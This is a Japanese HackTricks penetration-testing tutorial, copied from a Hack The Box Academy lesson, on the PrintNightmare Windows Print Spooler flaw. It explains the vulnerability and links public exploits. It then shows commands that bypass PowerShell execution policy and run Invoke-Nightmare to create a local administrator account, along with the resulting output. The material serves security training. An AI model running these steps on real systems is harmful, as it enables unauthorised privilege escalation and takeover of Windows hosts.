# PrintNightmare

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* サイバーセキュリティ会社で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

**このページは**[**https://academy.hackthebox.com/module/67/section/627**](https://academy.hackthebox.com/module/67/section/627)**からコピーされました。**

`CVE-2021-1675/CVE-2021-34527 PrintNightmare`は、リモート印刷とドライバのインストールを許可するために使用される[RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22)の欠陥です。\
この機能は、通常、組み込みの管理者グループおよびプリントオペレーターのユーザーがエンドユーザーのマシンにリモートでプリンタードライバをインストールする必要がある場合に予約されている、Windows特権`SeLoadDriverPrivilege`を持つユーザーにドライバを追加する機能を提供することを意図しています。

この欠陥により、**認証済みのユーザーは特権を持たなくても印刷ドライバを追加**できるようになり、影響を受けるシステムのいずれにおいても、攻撃者はシステム全体で**SYSTEMとしてリモートでコードを実行**することができます。この欠陥は、**サポートされているWindowsのすべてのバージョンに影響**を与えます。また、**Print Spooler**はデフォルトで**ドメインコントローラ**、Windows 7および10で実行され、Windowsサーバーでもよく有効にされているため、これは大規模な攻撃対象となります。そのため、「ナイトメア」と呼ばれています。

Microsoftは最初に問題を修正しないパッチをリリースしました（早期のガイダンスではSpoolerサービスを無効にすることが推奨されていましたが、多くの組織には実用的ではありません）。しかし、2021年7月に[パッチ](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)と、特定のレジストリ設定が`0`に設定されているか未定義であることを確認するためのガイダンスをリリースしました。

この脆弱性が公開されると、PoCのエクスプロイトが比較的迅速にリリースされました。[@cube0x0](https://twitter.com/cube0x0)による[**このバージョン**](https://github.com/cube0x0/CVE-2021-1675)は、修正されたImpacketの変更バージョンを使用して、リモートまたはローカルで悪意のあるDLLを実行するために使用できます。このリポジトリには、**C#の実装**も含まれています。\
この[**PowerShellの実装**](https://github.com/calebstewart/CVE-2021-1675)は、クイックなローカル特権昇格に使用できます。デフォルトでは、このスクリプトは新しいローカル管理者ユーザーを追加しますが、ローカル管理者ユーザーの追加がスコープ外の場合は、逆シェルなどを取得するためにカスタムDLLを指定することもできます。

### **Spoolerサービスの確認**

次のコマンドを使用して、Spoolerサービスが実行されているかどうかを簡単に確認できます。実行されていない場合、"パスが存在しません"というエラーが表示されます。
```
PS C:\htb> ls \\localhost\pipe\spoolss


Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
spoolss
```
### **PrintNightmare PowerShell PoCを使用してローカル管理者を追加する**

まず、ターゲットホストで実行ポリシーを[バイパス](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)します。
```
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```
今、PowerShellスクリプトをインポートして、新しいローカル管理者ユーザーを追加することができます。
```powershell
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
```
### **新しい管理者ユーザーの確認**

計画通りに進んだ場合、私たちはコントロール下に新しいローカル管理者ユーザーを持っているはずです。ユーザーの追加は「騒々しい」ですので、ステルスが考慮される評価ではこれを行うことは望ましくありません。さらに、アカウントの作成が評価の範囲内にあることをクライアントと確認する必要があります。
```
PS C:\htb> net user hacker

User name                    hacker
Full Name                    hacker
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?8/?9/?2021 12:12:01 PM
Password expires             Never
Password changeable          ?8/?9/?2021 12:12:01 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
